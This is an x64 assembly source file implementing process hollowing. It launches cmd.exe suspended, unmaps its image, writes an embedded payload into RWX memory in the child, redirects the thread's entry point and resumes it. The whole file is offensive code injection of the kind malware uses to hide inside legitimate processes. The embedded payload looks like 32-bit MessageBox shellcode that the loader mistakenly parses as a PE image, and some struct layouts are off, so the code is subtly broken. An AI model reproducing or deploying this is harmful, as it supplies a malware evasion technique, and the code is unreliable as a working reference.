; windows_injection_processhollowing.asm

extrn ExitProcess :PROC
extrn CreateProcessA :PROC
extrn NtQueryInformationProcess :PROC
extrn ReadProcessMemory :PROC
extrn NtUnmapViewOfSection :PROC
extrn VirtualAllocEx :PROC
extrn WriteProcessMemory :PROC
extrn GetThreadContext :PROC
extrn SetThreadContext :PROC
extrn ResumeThread :PROC
extrn GetLastError :PROC

_STARTUPINFOA STRUCT
    cb              DWORD ?
    padding1        DB 4 DUP (?)
    lpReverved      QWORD ?
    lpDesktop       QWORD ?
    lpTitle         QWORD ?
    dwX             DWORD ?
    dwY             DWORD ?
    dwXSize         DWORD ?
    dwYSize         DWORD ?
    dwXCountChars   DWORD ?
    dwYCountChars   DWORD ?
    dwFillAttribute DWORD ?
    dwFlags         DWORD ?
    wShowWindow     WORD ?
    cbReverved2     WORD ?
    padding2        DB 4 DUP (?)
    lpReserved2     QWORD ?
    hStdInput       QWORD ?
    hStdOutput      QWORD ?
    hStdError       QWORD ?
_STARTUPINFOA ENDS

_PROCESS_INFORMATION STRUCT
    hProcess        QWORD ?
    hThread         QWORD ?
    dwProcessID     QWORD ?
    dwThreadID      QWORD ?
_PROCESS_INFORMATION ENDS

_PROCESS_BASIC_INFORMATION STRUCT
    ExitStatus                      DQ ?
    PebBaseAddress                  DQ ?
    AffinityMask                    DQ ?
    BasePriority                    DQ ?
    UniqueProcessID                 DQ ?
    InheritedFromUniqueProcessId    DQ ?
_PROCESS_BASIC_INFORMATION ENDS

_IMAGE_FILE_HEADER STRUCT
    Machine                 DW ?
    NumberOfSections        DW ?
    TimeDateStamp           DD ?
    PointerToSymbolTable    DD ?
    NumberOfSymbols         DD ?
    SizeOfOptionalHeader    DW ?
    Characteristics         DW ?
_IMAGE_FILE_HEADER ENDS

_IMAGE_DATA_DIRECTORY STRUCT
    VirtualAddress          DD ?
    _Size                   DD ?
_IMAGE_DATA_DIRECTORY ENDS


_IMAGE_OPTIONAL_HEADER64 STRUCT
    Magic                       DW ?
    MajorLinkerVersion          DB ?
    MinorLinkerVersion          DB ?
    SizeOfCode                  DD ?
    SizeOfInitializedData       DD ?
    SizeOfUninitializedData     DD ?
    AddressOfEntryPoint         DD ?
    BaseOfCode                  DD ?
    ImageBase                   DQ ?
    SectionAlignment            DD ?
    FileAlignment               DD ?
    MajorOperatingSystemVersion DW ?
    MinorOperatingSystemVersion DW ?
    MajorImageVersion           DW ?
    MinorImageVersion           DW ?
    MajorSubsystemVersion       DW ?
    MinorSubsystemVersion       DW ?
    Win32VersionValue           DD ?
    SizeOfImage                 DD ?
    SizeOfHeaders               DD ?
    CheckSum                    DD ?
    Subsystem                   DW ?
    DllCharacteristics          DW ?
    SizeOfStackReserve          DQ ?
    SizeOfStackCommit           DQ ?
    SizeOfHeapReserve           DQ ?
    SizeOfHeapCommit            DQ ?
    LoaderFlags                 DD ?
    NumberOfRvaAndSizes         DD ?
    DataDirectory               _IMAGE_DATA_DIRECTORY 16 DUP (<>)    
_IMAGE_OPTIONAL_HEADER64 ENDS

_IMAGE_NT_HEADERS64 STRUCT
    Signature           DD ?
    FileHeader          _IMAGE_FILE_HEADER <>
    OptionalHeader      _IMAGE_OPTIONAL_HEADER64 <>
_IMAGE_NT_HEADERS64 ENDS

_IMAGE_SECTION_HEADER STRUCT
    Name                    DB 8 DUP (?)
    PhysicalAddress         DQ ?
    VirtualSize             DD ?
    VirtualAddress          DD ?
    SizeOfRawData           DD ?
    PointerToRawData        DD ?
    PointerToRelocations    DD ?
    PointerToLineNumbers    DD ?
    NumberOfRelocations     DW ?
    NumberOfLineNumbers     DW ?
    Characteristics         DD ?
_IMAGE_SECTION_HEADER ENDS

_CONTEXT STRUCT 16
    P1Home              DQ ?
    P2Home              DQ ?
    P3Home              DQ ?
    P4Home              DQ ?
    P5Home              DQ ?
    P6Home              DQ ?
    ContextFlags        DD ?
    MxCsr               DD ?
    SegCs               DW ?
    SegDs               DW ?
    SegEs               DW ?
    SegFs               DW ?
    SegGs               DW ?
    SegSs               DW ?
    EFlags              DD ?
    _Dr0                DQ ?
    _Dr1                DQ ?
    _Dr2                DQ ?
    _Dr3                DQ ?
    _Dr6                DQ ?
    _Dr7                DQ ?
    _Rax                DQ ?
    _Rcx                DQ ?
    _Rdx                DQ ?
    _Rbx                DQ ?
    _Rsp                DQ ?
    _Rbp                DQ ?
    _Rsi                DQ ?
    _Rdi                DQ ?
    _R8                 DQ ?
    _R9                 DQ ?
    _R10                DQ ?
    _R11                DQ ?
    _R12                DQ ?
    _R13                DQ ?
    _R14                DQ ?
    _R15                DQ ?
    _Rip                DQ ?
    FltsSave            DB 200h DUP (?)
    Header              DB 20h DUP (?)
    Legacy              DB 80h DUP (?)
    _Xmm0               DB 10h DUP (?)
    _Xmm1               DB 10h DUP (?)
    _Xmm2               DB 10h DUP (?)
    _Xmm3               DB 10h DUP (?)
    _Xmm4               DB 10h DUP (?)
    _Xmm5               DB 10h DUP (?)
    _Xmm6               DB 10h DUP (?)
    _Xmm7               DB 10h DUP (?)
    _Xmm8               DB 10h DUP (?)
    _Xmm9               DB 10h DUP (?)
    _Xmm10              DB 10h DUP (?)
    _Xmm11              DB 10h DUP (?)
    _Xmm12              DB 10h DUP (?)
    _Xmm13              DB 10h DUP (?)
    _Xmm14              DB 10h DUP (?)
    _Xmm15              DB 10h DUP (?)
    VectorRegister      DB 260h DUP (?)
    VectorControl       DQ ?
    DebugControl        DQ ?
    LastBranchToRip     DQ ?
    LastBranchFromRip   DQ ?
    LastExceptionToRip  DQ ?
    LastExceptionFromRip DQ ?
_CONTEXT ENDS

.data
    startExe    DB 0d9h,0ebh,9bh,0d9h,74h,24h,0f4h,31h
DB 0d2h,0b2h,77h,31h,0c9h,64h,8bh,71h
DB 30h,8bh,76h,0ch,8bh,76h,1ch,8bh
DB 46h,08h,8bh,7eh,20h,8bh,36h,38h
DB 4fh,18h,75h,0f3h,59h,01h,0d1h,0ffh
DB 0e1h,60h,8bh,6ch,24h,24h,8bh,45h
DB 3ch,8bh,54h,28h,78h,01h,0eah,8bh
DB 4ah,18h,8bh,5ah,20h,01h,0ebh,0e3h
DB 34h,49h,8bh,34h,8bh,01h,0eeh,31h
DB 0ffh,31h,0c0h,0fch,0ach,84h,0c0h,74h
DB 07h,0c1h,0cfh,0dh,01h,0c7h,0ebh,0f4h
DB 3bh,7ch,24h,28h,75h,0e1h,8bh,5ah
DB 24h,01h,0ebh,66h,8bh,0ch,4bh,8bh
DB 5ah,1ch,01h,0ebh,8bh,04h,8bh,01h
DB 0e8h,89h,44h,24h,1ch,61h,0c3h,0b2h
DB 08h,29h,0d4h,89h,0e5h,89h,0c2h,68h
DB 8eh,4eh,0eh,0ech,52h,0e8h,9fh,0ffh
DB 0ffh,0ffh,89h,45h,04h,0bbh,7eh,0d8h
DB 0e2h,73h,87h,1ch,24h,52h,0e8h,8eh
DB 0ffh,0ffh,0ffh,89h,45h,08h,68h,6ch
DB 6ch,20h,41h,68h,33h,32h,2eh,64h
DB 68h,75h,73h,65h,72h,30h,0dbh,88h
DB 5ch,24h,0ah,89h,0e6h,56h,0ffh,55h
DB 04h,89h,0c2h,50h,0bbh,0a8h,0a2h,4dh
DB 0bch,87h,1ch,24h,52h,0e8h,5fh,0ffh
DB 0ffh,0ffh,68h,6fh,58h,20h,20h,68h
DB 68h,65h,6ch,6ch,31h,0dbh,88h,5ch
DB 24h,05h,89h,0e3h,68h,6fh,58h,20h
DB 20h,68h,68h,65h,6ch,6ch,31h,0c9h
DB 88h,4ch,24h,05h,89h,0e1h,31h,0d2h
DB 52h,53h,51h,52h,0ffh,0d0h,31h,0c0h
DB 50h,0ffh,55h,08h

    PrcName             DB "C:\Windows\System32\cmd.exe", 0
    ALIGN               16
    SUInfo              _STARTUPINFOA <>
    ALIGN               16
    PrcInfo             _PROCESS_INFORMATION <>
    ALIGN               16
    PrcBasicInfo        _PROCESS_BASIC_INFORMATION <>
    ALIGN               16
    ct                  _CONTEXT <>
    ALIGN               16
    ReturnLength        DQ ?
    legitImageBase      DQ ?
    evilImageBase       DQ ?
    memAlloc            DQ ?

    e_lfanew            DD ?
    SizeOfImage         DD ?
    SizeOfHeaders       DD ?
    NumberOfSections    DW ?

.code
Start PROC
    SUB     rsp, 28h

_CreateProcess:
    XOR     rcx, rcx
    LEA     rdx, PrcName
    XOR     r8, r8
    XOR     r9, r9
    SUB     rsp, 50h
    LEA     rax, PrcInfo
    MOV     [rsp+48h], rax
    LEA     rax, SUInfo
    MOV     [rsp+40h], rax
    XOR     rax, rax
    MOV     [rsp+38h], rax
    MOV     [rsp+30h], rax
    MOV     qword ptr [rsp+28h], 4
    MOV     [rsp+20h], rax
    CALL    CreateProcessA
    ADD     rsp, 50h
    CMP     rax, 0
    JE      _exit

_GetThreadContext:
    MOV     rcx, PrcInfo.hThread
    MOV     ct.ContextFlags, 10001Fh
    LEA     rdx, ct
    CALL    GetThreadContext

_ReadProcessMemory:
    MOV     rcx, PrcInfo.hProcess
    MOV     rdx, ct._Rdx
    ADD     rdx, 10h
    LEA     r8, legitImageBase
    MOV     r9, SIZEOF legitImageBase
    SUB     rsp, 28h
    XOR     r10, r10
    MOV     [rsp+20h], r10
    CALL    ReadProcessMemory
    ADD     rsp, 28h
    CMP     rax, 0
    JE      _exit

_NtUnmapViewOfSection:
    MOV     rcx, PrcInfo.hProcess
    MOV     rdx, legitImageBase
    CALL    NtUnmapViewOfSection
    CMP     rax, 0
    JNE     _exit

_grab_headers_values:
    LEA     rax, [startExe+3Ch]
    MOV     rax, [rax]
    MOV     e_lfanew, eax
    ADD     eax, 50h
    LEA     rax, [startExe+eax]
    MOV     rax, [rax]
    MOV     SizeOfImage, eax
    MOV     eax, e_lfanew
    ADD     eax, 54h
    LEA     rax, [startExe+eax]
    MOV     rax, [rax]
    MOV     SizeOfHeaders, eax
    MOV     eax, e_lfanew
    ADD     eax, 6
    LEA     rax, [startExe+eax]
    MOV     rax, [rax]
    MOV     NumberOfSections, ax
    MOV     eax, e_lfanew
    ADD     eax, 30h
    LEA     rax, [startExe+eax]
    MOV     rax, [rax]
    MOV     evilImageBase, rax

_VirtualAllocEx:
    MOV     rcx, PrcInfo.hProcess
    XOR     rdx, rdx
    MOV     rdx, evilImageBase
    XOR     r8, r8
    MOV     r8d, SizeOfImage
    MOV     r9, 3000h
    SUB     rsp, 28h
    MOV     qword ptr [rsp+20h], 40h
    CALL    VirtualAllocEx
    ADD     rsp, 28h
    MOV     memAlloc, rax
    ; DB      0CCh

_newBaseAddress_code:
    LEA     rax, startExe
    XOR     rbx, rbx
    MOV     ebx, e_lfanew
    ADD     rax, rbx
    ADD     rax, 30h
    MOV     rbx, memAlloc
    MOV     [rax], rbx

_WriteProcessMemory_headers:
    MOV     rcx, PrcInfo.hProcess
    MOV     rdx, memAlloc
    LEA     r8, startExe
    XOR     r9, r9
    MOV     r9d, SizeOfHeaders
    SUb     rsp, 28h
    XOR     rax, rax
    MOV     [rsp+20h], rax
    CALL    WriteProcessMemory
    ADD     rsp, 28h
    CMP     rax, 0
    JE      _exit

_init_loop_counter:
    XOR     rcx, rcx

_loopToWriteRemainingSections:
    PUSH    rcx
    XOR     rbx, rbx
    MOV     ebx, e_lfanew
    ADD     rbx, SIZEOF _IMAGE_NT_HEADERS64
    LEA     rsi, [startExe+rbx]
    MOV     rax, SIZEOF _IMAGE_SECTION_HEADER
    MUL     rcx
    ADD     rsi, rax
    MOV     r10, rsi
    MOV     rcx, PrcInfo.hProcess
    MOV     rdx, memAlloc
    XOR     rax, rax
    MOV     eax, [r10+0Ch]
    ADD     rdx, rax
    XOR     r8, r8
    MOV     r8d, [r10+14h]
    LEA     r8d, [startExe+r8]
    XOR     r9, r9
    MOV     r9d, [r10+10h]
    SUB     rsp, 28h
    XOR     rax, rax
    MOV     [rsp+20h], rax
    CALL    WriteProcessMemory
    ADD     rsp, 28h

    POP     rcx
    INC     rcx

    CMP     cx, NumberOfSections
    JNE     _loopToWriteRemainingSections

_newBaseAddress_peb:
    MOV     rcx, PrcInfo.hProcess
    MOV     rdx, ct._Rdx
    ADD     rdx, 10h
    LEA     r8, memAlloc
    MOV     r9, SIZEOF memAlloc
    SUB     rsp, 28h
    XOR     rax, rax
    MOV     [rsp+20h], rax
    CALL    WriteProcessMemory
    ADD     rsp, 28h
    CMP     rax, 0
    JE      _exit

_newEntryPoint_context:
    MOV     rax, memAlloc
    XOR     rbx, rbx
    MOV     ebx, e_lfanew
    ADD     rbx, 28h
    XOR     rcx, rcx
    LEA     rcx, [startExe+rbx]
    XOR     rbx, rbx
    MOV     dword ptr ebx, [rcx]
    ADD     rbx, rax
    MOV     ct._Rcx, rbx

_SetThreadContext:
    MOV     rcx, PrcInfo.hThread
    LEA     rdx, ct
    CALL    SetThreadContext

_ResumeThread:
    MOV     rcx, [PrcInfo.hThread]
    CALL    ResumeThread

_exit:
    XOR     rcx, rcx
    CALL    ExitProcess

Start ENDP
End


